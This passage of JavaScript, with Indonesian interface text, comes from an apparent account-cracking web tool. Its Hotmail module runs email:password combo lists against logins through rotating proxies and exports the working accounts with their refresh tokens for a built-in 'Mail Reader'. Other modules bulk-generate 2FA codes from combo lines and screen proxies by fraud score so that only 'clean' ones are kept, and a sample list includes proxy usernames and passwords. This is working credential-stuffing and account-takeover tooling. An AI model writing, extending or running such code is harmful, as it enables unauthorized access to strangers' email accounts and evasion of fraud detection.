          if (!email || !password) {
            completedCount++;
            continue;
          }

          // Pick proxy round-robin if multiple proxies are provided
          let assignedProxy = null;
          if (useProxy && proxyList.length > 0) {
            assignedProxy = proxyList[idx % proxyList.length];
          }

          try {
            const res = await safeFetchJson('/api/hotmail/check_single', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                email: email,
                password: password,
                proxy: assignedProxy || null,
                timeout: timeout
              }),
              signal: hotmailAbortController ? hotmailAbortController.signal : undefined
            });

            if (res && res.bytes_used) {
              hotmailTotalBytesUsed += res.bytes_used;
              if (proxyBadge) proxyBadge.textContent = formatBytes(hotmailTotalBytesUsed);
            }

            if (res && res.live) {
              hotmailLiveItems.push(res);
              renderHotmailLiveTextarea();
              if (liveCnt) liveCnt.textContent = hotmailLiveItems.length;
            } else {
              const dieMsg = res && res.motivo ? res.motivo : 'Login failed';
              const dieLine = `${email}:${password} | ${dieMsg}`;
              hotmailDieResults.push(dieLine);
              if (dieArea) {
                dieArea.value = hotmailDieResults.join(String.fromCharCode(10));
                dieArea.scrollTop = dieArea.scrollHeight;
              }
              if (dieCnt) dieCnt.textContent = hotmailDieResults.length;
            }
          } catch (err) {
            if (hotmailAbortController && hotmailAbortController.signal.aborted) break;
            const errLine = `${email}:${password} | Error: ${err.message || 'Check failed'}`;
            hotmailDieResults.push(errLine);
            if (dieArea) {
              dieArea.value = hotmailDieResults.join(String.fromCharCode(10));
            }
            if (dieCnt) dieCnt.textContent = hotmailDieResults.length;
          }

          completedCount++;
          const pct = Math.round((completedCount / total) * 100);
          if (progBar) progBar.style.width = pct + '%';
          if (progTxt) progTxt.textContent = `${completedCount}/${total} (${pct}%)`;
        }
      }

      const workers = [];
      for (let w = 0; w < Math.min(concurrency, total); w++) {
        workers.push(worker());
      }

      await Promise.all(workers);

      if (document.getElementById('btnStartHotmail')) document.getElementById('btnStartHotmail').disabled = false;
      if (document.getElementById('btnStopHotmail')) document.getElementById('btnStopHotmail').disabled = true;
      if (progBar) progBar.style.width = '100%';
      if (progTxt) progTxt.textContent = `${total}/${total} (100% Selesai)`;
      showToast(`Pengecekan Hotmail selesai! Live: ${hotmailLiveItems.length}, Die: ${hotmailDieResults.length}`, 'fa-solid fa-circle-check text-success');
    }

    function stopHotmailChecking() {
      if (hotmailAbortController) {
        hotmailAbortController.abort();
      }
      if (document.getElementById('btnStartHotmail')) document.getElementById('btnStartHotmail').disabled = false;
      if (document.getElementById('btnStopHotmail')) document.getElementById('btnStopHotmail').disabled = true;
      showToast('Pengecekan Hotmail dihentikan.', 'fa-solid fa-hand text-warning');
    }

    let currentHotmailFormat = 'token';

    function setHotmailDisplayFormat(fmt) {
      currentHotmailFormat = fmt;
      ['btnFmtToken', 'btnFmtInfo', 'btnFmtSimple'].forEach(id => {
        const el = document.getElementById(id);
        if (el) {
          el.classList.remove('active', 'btn-outline-warning');
          el.classList.add('btn-outline-secondary', 'text-light');
        }
      });
      const activeBtn = document.getElementById(fmt === 'token' ? 'btnFmtToken' : (fmt === 'info' ? 'btnFmtInfo' : 'btnFmtSimple'));
      if (activeBtn) {
        activeBtn.classList.add('active', 'btn-outline-warning');
        activeBtn.classList.remove('btn-outline-secondary', 'text-light');
      }
      renderHotmailLiveTextarea();
    }

    function renderHotmailLiveTextarea() {
      const liveArea = document.getElementById('hotmailLiveResult');
      if (!liveArea) return;
      if (!hotmailLiveItems || hotmailLiveItems.length === 0) {
        return;
      }
      let lines = [];
      if (currentHotmailFormat === 'simple') {
        lines = hotmailLiveItems.map(it => `${it.email}:${it.password}`);
      } else if (currentHotmailFormat === 'info') {
        lines = hotmailLiveItems.map(it => `${it.email}:${it.password} | ${it.motivo || 'Login OK'}`);
      } else {
        // format token (Mail Reader ready)
        lines = hotmailLiveItems.map(it => it.refresh_token ? `${it.email}|${it.password}|${it.refresh_token}|${it.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753'}` : `${it.email}:${it.password} | Login OK (No Token)`);
      }
      liveArea.value = lines.join(String.fromCharCode(10));
      liveArea.scrollTop = liveArea.scrollHeight;
    }

    function copyHotmailLive(format = 'token') {
      if (!hotmailLiveItems || hotmailLiveItems.length === 0) {
        const txt = document.getElementById('hotmailLiveResult')?.value || '';
        if (!txt.trim()) return showToast('Belum ada akun LIVE untuk disalin!', 'fa-solid fa-triangle-exclamation text-warning');
        return copyToClipboard(txt, '✓ ' + getI18nText('tm_copied', 'Disalin!'), 'fa-solid fa-copy text-success');
      }

      let lines = [];
      if (format === 'combo') {
        lines = hotmailLiveItems.map(it => `${it.email}:${it.password}`);
      } else if (format === 'full') {
        lines = hotmailLiveItems.map(it => `${it.email}:${it.password} | ${it.motivo || 'Login OK'}`);
      } else {
        // format token (Mail Reader ready)
        lines = hotmailLiveItems.map(it => it.refresh_token ? `${it.email}|${it.password}|${it.refresh_token}|${it.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753'}` : `${it.email}:${it.password}`);
      }

      copyToClipboard(lines.join(String.fromCharCode(10)), `✓ Disalin ${lines.length} Akun LIVE (${format.toUpperCase()})`, 'fa-solid fa-key text-warning');
    }

    function downloadHotmailLive(format = 'token') {
      if (!hotmailLiveItems || hotmailLiveItems.length === 0) {
        const txt = document.getElementById('hotmailLiveResult')?.value || '';
        if (!txt.trim()) return showToast('Belum ada akun LIVE untuk disimpan!', 'fa-solid fa-triangle-exclamation text-warning');
        return downloadField('hotmailLiveResult', 'hotmail_live.txt');
      }

      let lines = [];
      let filename = 'hotmail_live.txt';
      if (format === 'combo') {
        lines = hotmailLiveItems.map(it => `${it.email}:${it.password}`);
        filename = 'hotmail_live_combo.txt';
      } else {
        lines = hotmailLiveItems.map(it => it.refresh_token ? `${it.email}|${it.password}|${it.refresh_token}|${it.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753'}` : `${it.email}:${it.password}`);
        filename = 'hotmail_live_tokens.txt';
      }

      const blob = new Blob([lines.join(String.fromCharCode(10))], { type: 'text/plain;charset=utf-8;' });
      const link = document.createElement('a');
      link.href = URL.createObjectURL(blob);
      link.download = filename;
      link.click();
    }

    async function transferLiveToMailReader() {
      if (!hotmailLiveItems || hotmailLiveItems.length === 0) {
        return showToast('Belum ada akun LIVE. Silakan jalankan pengecekan terlebih dahulu!', 'fa-solid fa-triangle-exclamation text-warning');
      }

      const tokenLines = hotmailLiveItems
        .filter(it => it && it.refresh_token)
        .map(it => `${it.email}|${it.password}|${it.refresh_token}|${it.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753'}`)
        .join(String.fromCharCode(10));

      if (!tokenLines) {
        return showToast('Tidak ada token yang dapat ditransfer.', 'fa-solid fa-triangle-exclamation text-warning');
      }

      // Switch to Mail Reader tab
      const tabBtn = document.querySelector('.main-nav-tab[onclick*="tab-mail"]');
      if (tabBtn) tabBtn.click();
      if (typeof selectMobileTab === 'function') selectMobileTab('mail');

      showToast(`Mengimpor ${hotmailLiveItems.length} akun LIVE ke Mail Reader...`, 'fa-solid fa-spinner fa-spin text-warning');
      await importAccountsFromText(tokenLines);
    }

    
    /* ================= 2FA GENERATOR LOGIC ================= */
    let single2faTimerInterval = null;
    let currentSingle2faCode = "";

    function resetSingle2fa() {
      if (single2faTimerInterval) {
        clearInterval(single2faTimerInterval);
        single2faTimerInterval = null;
      }
      currentSingle2faCode = "";
      const display = document.getElementById('single2faCodeDisplay');
      const copyBtn = document.getElementById('btnCopySingle2fa');
      const bar = document.getElementById('single2faTimerBar');
      const txt = document.getElementById('single2faTimerText');

      if (display) display.textContent = '------';
      if (copyBtn) copyBtn.disabled = true;
      if (bar) {
        bar.style.width = '0%';
        bar.className = 'progress-bar bg-warning';
      }
      if (txt) txt.textContent = '--s';
    }

    function extract2faSecret(raw) {
      if (!raw) return '';
      let str = raw.trim();
      if (str.toLowerCase().startsWith('otpauth://')) {
        try {
          const u = new URL(str);
          const s = u.searchParams.get('secret');
          if (s) return s.replace(/[\s\-]+/g, '').toUpperCase();
        } catch(e) {}
      }

      let parts = null;
      if (str.includes('|')) {
        parts = str.split('|');
      } else if (str.includes(';')) {
        parts = str.split(';');
      } else if (str.includes('\t')) {
        parts = str.split('\t');
      } else if (str.includes(':') && (str.match(/:/g) || []).length >= 2) {
        parts = str.split(':');
      } else if (str.includes(',') && str.includes('@')) {
        parts = str.split(',');
      }

      if (parts && parts.length > 1) {
        for (let i = parts.length - 1; i >= 0; i--) {
          const candidate = parts[i].trim().replace(/[\s\-]+/g, '');
          if (candidate.length >= 8 && !candidate.includes('@') && /^[A-Za-z2-7=]+$/.test(candidate)) {
            return candidate.toUpperCase();
          }
        }
        for (let i = parts.length - 1; i >= 0; i--) {
          const candidate = parts[i].trim().replace(/[\s\-]+/g, '');
          if (candidate.length >= 8 && !candidate.includes('@')) {
            return candidate.toUpperCase();
          }
        }
      }

      return str.replace(/[\s\-]+/g, '').toUpperCase();
    }

    function clearBulk2fa() {
      const inEl = document.getElementById('bulk2faInput');
      const outEl = document.getElementById('bulk2faOutput');
      const cntEl = document.getElementById('bulk2faCount');
      if (inEl) inEl.value = '';
      if (outEl) outEl.value = '';
      if (cntEl) cntEl.textContent = '0 generated';
    }

    async function generateBulk2fa() {
      const inEl = document.getElementById('bulk2faInput');
      const outEl = document.getElementById('bulk2faOutput');
      const cntEl = document.getElementById('bulk2faCount');
      const raw = (inEl ? inEl.value : '').trim();
      if (!raw) return showToast(getI18nText('tfa_alert_empty_bulk', 'Silakan masukkan list secret / combo!'), 'fa-solid fa-triangle-exclamation text-warning');

      const lines = raw.split(String.fromCharCode(10)).map(l => l.trim()).filter(Boolean);
      if (lines.length === 0) return showToast(getI18nText('tfa_alert_empty_bulk', 'Tidak ada data yang valid.'), 'fa-solid fa-triangle-exclamation text-warning');

      if (outEl) outEl.value = getI18nText('tfa_processing', 'Memproses...');

      try {
        const secretsToExtract = [];
        const comboMap = [];

        lines.forEach((line) => {
          const sec = extract2faSecret(line);
          secretsToExtract.push(sec);
          comboMap.push({ raw: line, secret: sec });
        });

        const res = await safeFetchJson('/api/2fa/generate', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ secrets: secretsToExtract })
        });

        if (res && res.data) {
          const outLines = [];
          comboMap.forEach((item, idx) => {
            const match = res.data[idx] || {};
            const code = match.code && match.code !== 'error' ? match.code : 'INVALID';
            outLines.push(`${item.raw} | 2FA: ${code}`);
          });
          if (outEl) outEl.value = outLines.join(String.fromCharCode(10));
          if (cntEl) cntEl.textContent = `${res.data.length} generated`;
        } else {
          if (outEl) outEl.value = 'Failed to generate 2FA codes.';
        }
      } catch (err) {
        if (outEl) outEl.value = 'Error: ' + err.message;
        showToast('Bulk 2FA error: ' + err.message, 'fa-solid fa-circle-xmark text-danger');
      }
    }

    function start2faCountdown(onExpired) {
      if (single2faTimerInterval) clearInterval(single2faTimerInterval);
      
      function update() {
        const now = Math.floor(Date.now() / 1000);
        const remaining = 30 - (now % 30);
        const pct = (remaining / 30) * 100;
        
        const bar = document.getElementById('single2faTimerBar');
        const txt = document.getElementById('single2faTimerText');
        if (bar) {
          bar.style.width = pct + '%';
          bar.className = remaining <= 5 ? 'progress-bar bg-danger' : (remaining <= 10 ? 'progress-bar bg-warning' : 'progress-bar bg-success');
        }
        if (txt) {
          txt.textContent = remaining + 's';
        }

        if (remaining === 30 && typeof onExpired === 'function') {
          onExpired();
        }
      }

      update();
      single2faTimerInterval = setInterval(update, 1000);
    }

    async function generateSingle2fa() {
      const input = document.getElementById('single2faSecret');
      let rawVal = (input ? input.value : '').trim();
      if (!rawVal) {
        resetSingle2fa();
        return showToast(getI18nText('tfa_alert_empty_single', 'Silakan masukkan 2FA Secret Key!'), 'fa-solid fa-triangle-exclamation text-warning');
      }

      const secret = extract2faSecret(rawVal);

      const display = document.getElementById('single2faCodeDisplay');
      const copyBtn = document.getElementById('btnCopySingle2fa');
      display.innerHTML = '<i class="fa-solid fa-spinner fa-spin fs-4 text-warning"></i>';

      try {
        let code = '';
        const proxRes = await safeFetchJson('/api/2fa/generate', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ secrets: [secret] })
        });
        if (proxRes.ok && proxRes.data && proxRes.data.length > 0) {
          code = proxRes.data[0].code;
        }

        if (code && code !== 'error') {
          currentSingle2faCode = code;
          display.textContent = code;
          copyBtn.disabled = false;
          start2faCountdown(() => {
            generateSingle2fa();
          });
        } else {
          resetSingle2fa();
          display.textContent = 'INVALID';
          copyBtn.disabled = true;
          showToast('Secret Key invalid / error!', 'fa-solid fa-circle-xmark text-danger');
        }
      } catch (err) {
        resetSingle2fa();
        display.textContent = 'ERROR';
        copyBtn.disabled = true;
        showToast('Failed: ' + err.message, 'fa-solid fa-circle-xmark text-danger');
      }
    }

    function copySingle2fa() {
      if (!currentSingle2faCode || currentSingle2faCode === '------') return;
      copyToClipboard(currentSingle2faCode, '✓ ' + getI18nText('tm_copied', 'Disalin!') + ': ' + currentSingle2faCode, 'fa-solid fa-key text-warning');
    }

    // === PROXY CHECKER MODULE ===
    let proxyList = [];
    let proxyResults = [];
    let proxyAbortController = null;
    let proxyFilterMode = 'all';

    function loadSampleProxies() {
      const sample = [
        '5.45.36.142:5432:k8obp:alzx9cer',
        '5.45.36.134:5432:k8obp:alzx9cer',
        '5.45.36.141:5432:k8obp:alzx9cer',
        '5.45.36.137:5432:k8obp:alzx9cer',
        '104.28.16.1:8080'
      ].join(String.fromCharCode(10));
      const input = document.getElementById('proxyInput');
      if (input) input.value = sample;
    }

    function clearProxyInput() {
      const input = document.getElementById('proxyInput');
      if (input) input.value = '';
    }

    function setProxyFilter(mode) {
      proxyFilterMode = mode;
      ['All', 'Live', 'Dead', 'Clean'].forEach(k => {
        const btn = document.getElementById('filterProxy' + k);
        if (btn) {
          if (k.toLowerCase() === mode.toLowerCase()) {
            btn.classList.add('active');
          } else {
            btn.classList.remove('active');
          }
        }
      });
      renderProxyTable();
    }

    async function startProxyChecking() {
      const rawText = (document.getElementById('proxyInput') ? document.getElementById('proxyInput').value : '').trim();
      if (!rawText) return showToast(getI18nText('prx_alert_empty', 'Silakan masukkan list proxy!'), 'fa-solid fa-triangle-exclamation text-warning');

      const lines = rawText.split(String.fromCharCode(10)).map(l => l.trim()).filter(l => l && !l.startsWith('#'));
      if (lines.length === 0) return showToast(getI18nText('prx_alert_empty', 'Tidak ada proxy yang valid untuk dicek.'), 'fa-solid fa-triangle-exclamation text-warning');

      const concurrency = Math.min(20, Math.max(1, parseInt(document.getElementById('proxyConcurrency').value) || 5));
      const timeout = Math.min(60, Math.max(2, parseInt(document.getElementById('proxyTimeout').value) || 15));
      const checkScamalytics = Boolean(document.getElementById('checkScamalyticsToggle') && document.getElementById('checkScamalyticsToggle').checked);

      proxyList = lines;
      proxyResults = [];
      proxyAbortController = new AbortController();

      if (document.getElementById('btnStartProxy')) document.getElementById('btnStartProxy').disabled = true;
      if (document.getElementById('btnStopProxy')) document.getElementById('btnStopProxy').disabled = false;
      if (document.getElementById('proxyProgressBar')) document.getElementById('proxyProgressBar').style.width = '0%';

      updateProxyStats();
      renderProxyTable();

      let currentIndex = 0;
      const total = lines.length;

      async function worker() {
        while (currentIndex < total) {
          if (proxyAbortController && proxyAbortController.signal.aborted) break;
          const idx = currentIndex++;
          const proxyLine = lines[idx];

          try {
            const res = await safeFetchJson('/api/check_single_proxy', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                proxy: proxyLine,
                timeout: timeout,
                check_scamalytics: checkScamalytics
              }),
              signal: proxyAbortController ? proxyAbortController.signal : undefined
            });

            if (res) {
              proxyResults.push(res);
            } else {
              proxyResults.push({
                ok: true,
                live: false,
                display: proxyLine,
                raw: proxyLine,
                error: 'Request failed',
                latency_ms: 0
              });
            }
          } catch (err) {
            if (proxyAbortController && proxyAbortController.signal.aborted) break;
            proxyResults.push({
              ok: true,
              live: false,
              display: proxyLine,
              raw: proxyLine,
              error: err.message || 'Check failed',
              latency_ms: 0
            });
          }

          const pct = Math.round((proxyResults.length / total) * 100);
          if (document.getElementById('proxyProgressBar')) document.getElementById('proxyProgressBar').style.width = pct + '%';
          updateProxyStats();
          renderProxyTable();
        }
      }

      const workers = [];
      for (let w = 0; w < Math.min(concurrency, total); w++) {
        workers.push(worker());
      }

      await Promise.all(workers);

      if (document.getElementById('btnStartProxy')) document.getElementById('btnStartProxy').disabled = false;
      if (document.getElementById('btnStopProxy')) document.getElementById('btnStopProxy').disabled = true;
      if (document.getElementById('proxyProgressBar')) document.getElementById('proxyProgressBar').style.width = '100%';
    }

    function stopProxyChecking() {
      if (proxyAbortController) {
        proxyAbortController.abort();
      }
      if (document.getElementById('btnStartProxy')) document.getElementById('btnStartProxy').disabled = false;
      if (document.getElementById('btnStopProxy')) document.getElementById('btnStopProxy').disabled = true;
    }

    function updateProxyStats() {
      const total = proxyResults.length;
      const live = proxyResults.filter(r => r && r.live).length;
      const dead = proxyResults.filter(r => !r || !r.live).length;
      const clean = proxyResults.filter(r => r && r.live && r.fraud_score !== null && r.fraud_score !== undefined && r.fraud_score < 25).length;
      
      const liveItems = proxyResults.filter(r => r && r.live && r.latency_ms > 0);
      const avgLat = liveItems.length > 0 ? Math.round(liveItems.reduce((a, b) => a + (b.latency_ms || 0), 0) / liveItems.length) : '-';

      if (document.getElementById('proxyStatTotal')) document.getElementById('proxyStatTotal').textContent = total;
      if (document.getElementById('proxyStatLive')) document.getElementById('proxyStatLive').textContent = live;
      if (document.getElementById('proxyStatDead')) document.getElementById('proxyStatDead').textContent = dead;
      if (document.getElementById('proxyStatLatency')) document.getElementById('proxyStatLatency').textContent = avgLat !== '-' ? avgLat + 'ms' : '-';
      if (document.getElementById('proxyStatLowFraud')) document.getElementById('proxyStatLowFraud').textContent = clean;

      if (document.getElementById('countFilterAll')) document.getElementById('countFilterAll').textContent = total;
      if (document.getElementById('countFilterLive')) document.getElementById('countFilterLive').textContent = live;
      if (document.getElementById('countFilterDead')) document.getElementById('countFilterDead').textContent = dead;
      if (document.getElementById('countFilterClean')) document.getElementById('countFilterClean').textContent = clean;
    }

    function renderProxyTable() {
      try {
        const tbody = document.getElementById('proxyTableBody');
        if (!tbody) return;
        const searchInput = document.getElementById('proxySearchInput');
        const search = (searchInput && searchInput.value ? searchInput.value : '').toLowerCase().trim();

        if (!proxyResults || proxyResults.length === 0) {
          tbody.innerHTML = `
            <tr>
              <td colspan="8" class="text-center py-5 text-secondary">
                <i class="fa-solid fa-server fa-2x mb-2 d-block opacity-50"></i>
                ${typeof getI18nText === 'function' ? getI18nText('prx_empty_table', 'Belum ada proxy yang diperiksa. Masukkan list proxy dan klik <b>Start Checking</b>.') : 'Belum ada proxy yang diperiksa.'}
              </td>
            </tr>
          `;
          return;
        }

        const currentMode = typeof proxyFilterMode !== 'undefined' ? proxyFilterMode : 'all';

        let filtered = proxyResults.filter(item => {
          if (!item) return false;
          if (currentMode === 'live' && !item.live) return false;
          if (currentMode === 'dead' && item.live) return false;
          if (currentMode === 'clean' && (!item.live || item.fraud_score === null || item.fraud_score === undefined || item.fraud_score >= 25)) return false;

          if (search) {
            const hay = `${item.display || ''} ${item.exit_ip || ''} ${item.country || ''} ${item.isp || ''} ${item.org || ''}`.toLowerCase();
            if (!hay.includes(search)) return false;
          }
          return true;
        });

        if (filtered.length === 0) {
          tbody.innerHTML = `
            <tr>
              <td colspan="8" class="text-center py-4 text-secondary">
                ${typeof getI18nText === 'function' ? getI18nText('prx_no_match', 'Tidak ada proxy yang cocok dengan filter atau pencarian.') : 'Tidak ada proxy yang cocok.'}
              </td>
            </tr>
          `;
          return;
        }

        const esc = (s) => (s === null || s === undefined ? '' : String(s)).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');

        let html = '';
        filtered.forEach((r, idx) => {
          const isLive = Boolean(r && r.live);
          const lat = typeof r.latency_ms === 'number' ? r.latency_ms : 0;
          const pingClass = lat < 500 ? 'text-success' : (lat < 1200 ? 'text-warning' : 'text-danger');
          
          let fraudBadge = '<span class="text-secondary small">-</span>';
          if (r.fraud_score !== undefined && r.fraud_score !== null) {
            const s = r.fraud_score;
            const scoreClass = s < 25 ? 'bg-success' : (s < 50 ? 'bg-warning text-dark' : 'bg-danger');
            fraudBadge = `<span class="badge ${scoreClass} fw-bold me-1">${s}</span><span class="small text-secondary">${esc(r.fraud_risk || '')}</span>`;
          }

          const countryText = r.country ? `${r.country} ${r.country_code ? '(' + r.country_code + ')' : ''}` : '-';
          const locText = r.city && r.city !== '-' ? `${r.city}, ${countryText}` : countryText;
          const originalIdx = proxyResults.indexOf(r);

          html += `
            <tr>
              <td class="text-secondary small font-monospace">${idx + 1}</td>
              <td class="font-monospace text-light">
                <span class="badge bg-dark border border-secondary text-warning me-1 small">${esc((r.scheme || 'http').toUpperCase())}</span>
                ${esc(r.display || r.raw || '')}
              </td>
              <td>
                ${isLive ? '<span class="badge bg-success"><i class="fa-solid fa-circle-check me-1"></i>LIVE</span>' : '<span class="badge bg-danger"><i class="fa-solid fa-circle-xmark me-1"></i>DEAD</span>'}
              </td>
              <td>
                ${isLive ? `<span class="font-monospace fw-bold ${pingClass}"><i class="fa-solid fa-bolt fa-xs me-1"></i>${lat}ms</span>` : '<span class="text-secondary small">-</span>'}
              </td>
              <td>
                ${isLive ? `<div><span class="font-monospace fw-semibold text-warning">${esc(r.exit_ip || '-')}</span></div><div class="small text-secondary">${esc(locText)}</div>` : `<span class="text-danger small" title="${esc(r.error || '')}">${esc(r.error || 'Connection Failed')}</span>`}
              </td>
              <td class="small text-secondary" style="max-width: 140px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
                ${esc(r.isp || r.org || '-')}
              </td>
              <td>
                ${fraudBadge}
              </td>
              <td>
                <div class="d-flex gap-1">
                  <button class="btn btn-sm btn-outline-light p-1 px-2" onclick="copySingleProxyRaw(${originalIdx})" title="Salin Proxy">
                    <i class="fa-regular fa-copy fa-xs"></i>
                  </button>
                  <button class="btn btn-sm btn-outline-warning p-1 px-2" onclick="showProxyDetailModal(${originalIdx})" title="Detail Diagnostik">
                    <i class="fa-solid fa-eye fa-xs"></i>
                  </button>
                </div>
              </td>
            </tr>
          `;
        });

        tbody.innerHTML = html;
      } catch (err) {
        console.error('renderProxyTable error:', err);
      }
    }

    function copySingleProxyRaw(index) {
      const r = proxyResults[index];
      if (!r) return;
      const textToCopy = r.raw || r.display || '';
      if (!textToCopy) return;
      copyToClipboard(textToCopy, '✓ ' + getI18nText('tm_copied', 'Disalin!') + ': ' + textToCopy, 'fa-solid fa-server text-success');
    }

    function showProxyDetailModal(index) {
      const r = proxyResults[index];
      if (!r) return;
      const modalBody = document.getElementById('proxyDetailModalBody');
      if (!modalBody) return;

      const esc = (s) => (s === null || s === undefined ? '' : String(s)).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');

      let scamalyticsHtml = '';
      if (r.fraud_score !== undefined && r.fraud_score !== null) {
        scamalyticsHtml = `
          <div class="card bg-dark border-secondary p-3 mt-3">
            <h6 class="fw-bold text-warning mb-2"><i class="fa-solid fa-shield-halved me-1"></i> Scamalytics Report</h6>
            <div class="row g-2 small">
              <div class="col-6"><span class="text-secondary">Fraud Score:</span> <b class="${r.fraud_score < 25 ? 'text-success' : (r.fraud_score < 50 ? 'text-warning' : 'text-danger')}">${r.fraud_score}/100</b></div>
              <div class="col-6"><span class="text-secondary">Fraud Risk:</span> <b>${esc(r.fraud_risk || '-')}</b></div>
              <div class="col-6"><span class="text-secondary">Residential:</span> <b>${esc(r.residential || 'no')}</b></div>
              <div class="col-6"><span class="text-secondary">Datacenter:</span> <b>${esc(r.datacenter || 'no')}</b></div>
              <div class="col-12"><span class="text-secondary">Blacklist Hits:</span> <b>${r.blacklist_hits && r.blacklist_hits.length > 0 ? esc(r.blacklist_hits.join(', ')) : 'None'}</b></div>
            </div>
          </div>
        `;
      }

      modalBody.innerHTML = `
        <div class="p-2">
          <div class="d-flex justify-content-between align-items-center mb-3">
            <span class="badge ${r.live ? 'bg-success' : 'bg-danger'} fs-6">${r.live ? 'ONLINE / LIVE' : 'OFFLINE / DEAD'}</span>
            <span class="font-monospace text-warning fw-bold">${r.live ? r.latency_ms + ' ms' : ''}</span>
          </div>
          
          <table class="table table-dark table-sm border-secondary mb-0 small">
            <tr><td class="text-secondary" style="width: 35%;">Proxy Display</td><td class="font-monospace text-warning">${esc(r.display || r.raw || '')}</td></tr>
            <tr><td class="text-secondary">Scheme / Host</td><td>${esc(r.scheme || 'http')}://${esc(r.host || '')}:${esc(r.port || '')}</td></tr>
            <tr><td class="text-secondary">Public Exit IP</td><td class="font-monospace fw-bold text-info">${esc(r.exit_ip || '-')}</td></tr>
            <tr><td class="text-secondary">Country / Region</td><td>${esc(r.country || '-')} ${r.country_code ? '(' + esc(r.country_code) + ')' : ''} ${r.region ? '• ' + esc(r.region) : ''}</td></tr>
            <tr><td class="text-secondary">City</td><td>${esc(r.city || '-')}</td></tr>
            <tr><td class="text-secondary">ISP / Operator</td><td>${esc(r.isp || '-')}</td></tr>
            <tr><td class="text-secondary">Organization / AS</td><td>${esc(r.org || '-')} ${r.as ? '• ' + esc(r.as) : ''}</td></tr>
            ${!r.live && r.error ? `<tr><td class="text-danger">Error Detail</td><td class="text-danger">${esc(r.error)}</td></tr>` : ''}
          </table>

          ${scamalyticsHtml}
        </div>
      `;

      const modalEl = document.getElementById('proxyDetailModal');
      if (modalEl && typeof bootstrap !== 'undefined' && bootstrap.Modal) {
        const modal = new bootstrap.Modal(modalEl);
        modal.show();
      }
    }

    function copyLiveProxies(format = 'raw') {
      const live = proxyResults.filter(r => r && r.live);
      if (live.length === 0) return showToast(getI18nText('prx_no_live_copy', 'Tidak ada proxy LIVE untuk disalin.'), 'fa-solid fa-triangle-exclamation text-warning');

      let lines = [];
      if (format === 'ipport') {
        lines = live.map(r => `${r.host}:${r.port}`);
      } else {
        lines = live.map(r => r.raw || r.display);
      }

      copyToClipboard(lines.join(String.fromCharCode(10)), '✓ ' + getI18nText('tm_copied', 'Disalin!') + ` (${live.length} LIVE)`, 'fa-solid fa-server text-success');
    }

    function downloadLiveProxiesTxt() {
      const live = proxyResults.filter(r => r && r.live);
      if (live.length === 0) return showToast(getI18nText('prx_no_live_dl', 'Tidak ada proxy LIVE untuk diunduh.'), 'fa-solid fa-triangle-exclamation text-warning');
      const content = live.map(r => r.raw || r.display).join(String.fromCharCode(10));
      const blob = new Blob([content], { type: 'text/plain;charset=utf-8;' });
      const link = document.createElement('a');
      link.href = URL.createObjectURL(blob);
      link.download = `live_proxies_${Date.now()}.txt`;
      link.click();
    }

    function downloadProxyReportJson() {
      if (!proxyResults || proxyResults.length === 0) return showToast('Belum ada data untuk diekspor.', 'fa-solid fa-triangle-exclamation text-warning');
      const content = JSON.stringify(proxyResults, null, 2);
      const blob = new Blob([content], { type: 'application/json;charset=utf-8;' });
      const link = document.createElement('a');
      link.href = URL.createObjectURL(blob);
      link.download = `proxy_report_${Date.now()}.json`;
      link.click();
    }

    function copyField(elementId) {
      const el = document.getElementById(elementId);
      if (!el || !el.value.trim()) return;
      copyToClipboard(el.value, '✓ ' + getI18nText('tm_copied', 'Disalin ke clipboard!'), 'fa-solid fa-copy text-info');
    }

    function downloadField(elementId, filename) {
      const content = document.getElementById(elementId).value;
      if (!content.trim()) return showToast('Field is empty.', 'fa-solid fa-triangle-exclamation text-warning');
      const blob = new Blob([content], { type: 'text/plain;charset=utf-8;' });
      const link = document.createElement('a');
      link.href = URL.createObjectURL(blob);
      link.download = filename;
      link.click();
    }

    async function safeFetchJson(url, options = {}) {
      const res = await fetch(url, options);
      const text = await res.text();
      try {
        return JSON.parse(text);
      } catch (e) {
        throw new Error(`Invalid response (${res.status}): ` + (text.slice(0, 120).replace(/<[^>]+>/g, '').trim() || 'Internal error'));
      }
    }

    function parseOutlookLinesJS(rawText) {
      const emailRegex = /[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/;
      const clientIdRegex = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
      const defaultClientId = "9e5f94bc-e8a4-4e73-b8be-63364c29d753";
      
      const lines = (rawText || '').split(String.fromCharCode(10)).map(l => l.trim());
      const results = [];
      const seen = new Set();

      for (let rawLine of lines) {
        let line = rawLine.trim();
        if (!line || line.startsWith('#')) continue;

        let parts = [];
        if (line.includes('|')) {
          parts = line.split('|').map(p => p.trim()).filter(p => p);
        } else if (line.includes('----')) {
          parts = line.split('----').map(p => p.trim()).filter(p => p);
        } else if (line.includes('\t')) {
          parts = line.split('\t').map(p => p.trim()).filter(p => p);
        } else {
          parts = line.split(/[\s;]+/).map(p => p.trim()).filter(p => p);
        }

        if (!parts.length) continue;

        let email = '';
        let password = '';
        let token = '';
        let clientId = defaultClientId;

        const emailMatch = line.match(emailRegex);
        if (emailMatch) email = emailMatch[0].trim();

        for (const p of parts) {
          if (clientIdRegex.test(p)) {
            clientId = p;
            break;
          }
        }

        for (const p of parts) {
          if (p.startsWith('M.') || (p.length > 50 && p !== email && p !== clientId)) {
            token = p;
            break;
          }
        }

        if (!token) {
          if (parts.length >= 3 && parts[0] === email) {
            token = parts.length >= 4 ? parts[2] : parts[1];
            password = parts.length >= 4 ? parts[1] : '';
          } else if (parts.length === 1 && (parts[0].startsWith('M.') || parts[0].length > 40)) {
            token = parts[0];
          }
        }

        if (!token) continue;

        if (!password && parts.length >= 2 && parts[0] === email && parts[1] !== token) {
          password = parts[1];
